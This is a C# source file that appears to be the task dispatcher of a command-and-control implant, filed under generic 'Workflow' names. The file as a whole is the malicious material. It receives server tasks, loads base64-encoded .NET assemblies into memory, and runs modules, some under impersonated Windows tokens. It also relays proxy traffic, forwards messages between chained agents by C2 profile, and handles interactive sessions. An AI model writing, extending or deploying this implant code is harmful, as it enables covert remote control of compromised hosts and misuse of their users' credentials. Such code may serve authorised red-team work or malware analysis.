using Workflow.Contracts;
using Workflow.Models;
using Workflow.Utilities;
using System.Security.Principal;
using System.Text.Json;
using System.Text.Json.Serialization;

namespace Workflow.Providers
{
    public class RequestDispatcher : IRequestDispatcher
    {
        private ILogger logger { get; set; }
        public IComponentProvider assemblyManager { get; set; }
        private IDataBroker messageManager { get; set; }
        private ICredentialProvider tokenManager { get; set; }
        public RequestDispatcher(ILogger logger, IComponentProvider assemblyManager, IDataBroker messageManager, ICredentialProvider tokenManager)
        {
            this.logger = logger;
            this.assemblyManager = assemblyManager;
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }

        public async Task StartTaskAsync(ServerJob job)
        {
            DebugLog.Log($"Task received: {job.task.command} [{job.task.id}]");
            this.messageManager.AddJob(job);
            TaskResponse rr = new TaskResponse()
            {
                task_id = job.task.id,
                status = "completed",
                user_output = ""
            };
            switch (job.task.command)
            {
                case "load":
                    LoadCommand loadCommand = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                    if (loadCommand is not null)
                    {
                        byte[] buf = Misc.Base64DecodeToByteArray(loadCommand.asm);
                        if (buf.Length > 0)
                        {
                            DebugLog.Log($"Loading module: {loadCommand.command}");
                            if(this.assemblyManager.LoadModuleAsync(job.task.id, loadCommand.command, buf))
                            {
                                DebugLog.Log($"Module loaded: {loadCommand.command}");
                                LoadTaskResponse cr = new LoadTaskResponse()
                                {
                                    completed = true,
                                    user_output = $"Loaded module {loadCommand.command}",
                                    task_id = job.task.id,
                                    commands = new List<CommandsResponse>()
                                {
                                    new CommandsResponse()
                                    {
                                        action = "add",
                                        cmd = loadCommand.command,
                                    }
                                }
                                };
                                this.messageManager.AddTaskResponse(cr.ToJson());
                            }
                            else
                            {
                                DebugLog.Log($"Failed to load module: {loadCommand.command}");
                                LoadTaskResponse cr = new LoadTaskResponse()
                                {
                                    completed = true,
                                    user_output = $"Failed to load module {loadCommand.command}",
                                    task_id = job.task.id,
                                    commands = new List<CommandsResponse>()
                                };
                                this.messageManager.AddTaskResponse(cr.ToJson());
                            }
                        }
                    }
                    break;
                case "load-assembly":
                    DebugLog.Log($"Loading assembly [{job.task.id}]");
                    LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
                    if (command is not null)
                    {
                        byte[] buf = Misc.Base64DecodeToByteArray(command.asm);
                        if (buf.Length > 0)
                        {
                            this.assemblyManager.LoadAssemblyAsync(job.task.id, buf);
                        }
                    }
                    break;
                default:
                    DebugLog.Log($"Executing module: {job.task.command} [{job.task.id}]");
                    _ = Task.Run(async () =>
                    {
                        if (!this.assemblyManager.TryGetModule(job.task.command, out IModule plug))
                        {
                            DebugLog.Log($"Module not found: {job.task.command}");
                            this.messageManager.AddTaskResponse(new TaskResponse()
                            {
                                task_id = job.task.id,
                                user_output = "Module not found. Please load it.",
                                status = "error",
                                completed = true,
                            });
                            return;
                        }

                        if(job.task.token == 0)
                        {
                            try
                            {
                                await plug.Execute(job);
                            }
                            catch (Exception e)
                            {
                                DebugLog.Log($"Task execution error: {job.task.command} [{job.task.id}]: {e.Message}");
                                this.messageManager.AddTaskResponse(new TaskResponse()
                                {
                                    task_id = job.task.id,
                                    user_output = e.ToString(),
                                    status = "error",
                                    completed = true,
                                });
                            }
                            return;
                        }

                        try
                        {
                            tokenManager.RunTaskImpersonated(plug, job);
                        }
                        catch (Exception e)
                        {
                            DebugLog.Log($"Impersonated task error: {job.task.command} [{job.task.id}]: {e.Message}");
                            this.messageManager.AddTaskResponse(new TaskResponse()
                            {
                                task_id = job.task.id,
                                user_output = e.ToString(),
                                status = "error",
                                completed = true,
                            });
                        }
                        return;
                    });
                            
                    break;
            }
        }
        public async Task HandleServerResponses(List<ServerTaskingResponse> responses)
        {
            DebugLog.Log($"HandleServerResponses: {responses.Count} response(s)");
            List<Task> tasks = new List<Task>();
            foreach(var response in responses)
            {
                ServerJob job;

                if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetModule<IFileModule>(job.task.command, out var plugin))
                {
                    continue;
                }

                if(plugin is null)
                {
                    continue;
                }

                if (job.task.token > 0)
                {
                    tasks.Add(Task.Run(() => tokenManager.HandleFilePluginImpersonated(plugin, job, response)));
                    continue;
                }

                tasks.Add(Task.Run(() =>
                {
                    try
                    {
                        plugin.HandleNextMessage(response);
                    }
                    catch (Exception e)
                    {
                        messageManager.WriteLine(e.ToString(), response.task_id, true, "error");
                    }
                }));
            }

            await Task.WhenAll(tasks);
        }
        public async Task HandleProxyResponses(string type, List<ServerDatagram> responses)
        {
            DebugLog.Log($"HandleProxyResponses: type={type}, count={responses?.Count ?? 0}");
            List<Task> tasks = new List<Task>();
            if (!this.assemblyManager.TryGetModule<IProxyModule>(type, out var plugin))
            {
                return;
            }

            if (plugin is null)
            {
                return;
            }

            if(responses is null)
            {
                return;
            }

            foreach (var response in responses)
            {
                tasks.Add(plugin.HandleDatagram(response));
                //Task.Run(() => plugin.HandleDatagram(response));
            }
            await Task.WhenAll(tasks);

        }
        public async Task HandleDelegateResponses(List<DelegateMessage> responses)
        {
            DebugLog.Log($"HandleDelegateResponses: {responses.Count} delegate(s)");
            List<Task> tasks = new List<Task>();
            foreach(var response in responses)
            {
                if (!this.assemblyManager.TryGetModule<IForwarderModule>(response.c2_profile, out var plugin))
                {
                    continue;
                }

                if (plugin is null)
                {
                    continue;
                }

                try
                {
                    tasks.Add(plugin.ForwardDelegate(response));
                }
                catch { }
            }
            await Task.WhenAll(tasks);
        }
        public async Task HandleInteractiveResponses(List<InteractMessage> responses)
        {
            DebugLog.Log($"HandleInteractiveResponses: {responses.Count} message(s)");
            List<Task> tasks = new List<Task>();
            foreach(var response in responses)
            {
                ServerJob job;

                if (!this.messageManager.TryGetJob(response.task_id, out job) || !this.assemblyManager.TryGetModule<IInteractiveModule>(job.task.command, out var plugin))
                {
                    continue;
                }

                if (job.task.token > 0)
                {
                    tasks.Add(Task.Run(() => tokenManager.HandleInteractivePluginImpersonated(plugin, job, response)));
                    continue;
                }

                try
                {
                    tasks.Add(Task.Run(() => plugin.Interact(response)));
                }
                catch { }
            }

            //I might not need this
            await Task.WhenAll(tasks);
        }
    }
}
